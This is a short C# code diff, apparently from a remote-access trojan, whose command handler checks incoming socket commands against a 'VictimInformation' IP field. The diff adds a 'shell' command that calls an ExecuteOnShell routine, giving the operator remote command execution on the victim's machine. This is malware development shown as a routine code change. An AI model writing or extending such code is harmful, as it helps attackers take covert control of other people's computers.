@@ -13,7 +13,7 @@ internal partial class Handlers
             await Commands.GetIp(cmdSocket);
             return;
         }
-        if (cmdSocket.Data.Options.ElementAt(0)?.Value.ToString() != VictimInformation.Shared.ip.ToString()!)
+        if (cmdSocket.Data.Options.ElementAt(0)?.Value.ToString() != VictimInformation.Shared.IP.ToString()!)
             return;
 
         AnsiConsole.MarkupLine($"[cyan]Command Executed[/]: [red bold underline]{cmdSocket.Data.Name}[/]!");
@@ -25,6 +25,9 @@ internal partial class Handlers
                 break;
             case "rebuildcmd":
                 await Commands.RebuildCommands(cmdSocket);
+                break;
+            case "shell":
+                await Commands.ExecuteOnShell(cmdSocket);
                 break;
         }
     }
